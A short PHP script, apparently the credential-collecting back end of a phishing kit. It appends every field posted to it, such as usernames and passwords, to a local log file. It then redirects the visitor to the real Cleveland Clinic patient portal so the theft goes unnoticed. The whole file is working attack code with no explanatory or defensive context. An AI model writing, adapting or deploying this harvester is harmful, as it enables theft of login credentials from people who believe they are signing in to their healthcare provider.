<?php
header('Location: https://my.clevelandclinic.org/');
$file = fopen("log.txt", "a");
foreach($_POST as $variable =>$value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
}
?>